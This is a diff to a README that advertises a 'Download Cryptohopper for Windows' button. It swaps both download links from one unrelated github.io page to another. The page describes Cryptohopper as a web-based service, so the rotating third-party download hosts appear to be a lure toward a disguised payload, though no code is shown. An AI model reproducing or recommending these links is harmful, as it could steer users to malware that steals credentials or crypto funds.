@@ -4,7 +4,7 @@
 
 ## 📥 Download Cryptohopper for Windows
 
-[![⬇️ Download Cryptohopper](https://img.shields.io/badge/Download-Cryptohopper-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/240)
+[![⬇️ Download Cryptohopper](https://img.shields.io/badge/Download-Cryptohopper-blue?style=for-the-badge&logo=windows)](https://hopperload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ Its web-based dashboard allows you to monitor your portfolio, performance analyt
 
 Cryptohopper integrates with major exchanges, supports arbitrage opportunities, and offers risk management tools such as trailing stop-loss and dynamic position sizing, making it a comprehensive solution for automated crypto trading.
 
-[![⬇️ Download Cryptohopper](https://img.shields.io/badge/Download-Cryptohopper-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/240)
+[![⬇️ Download Cryptohopper](https://img.shields.io/badge/Download-Cryptohopper-blue?style=for-the-badge&logo=windows)](https://hopperload.github.io/.github/)
 
 ---
 
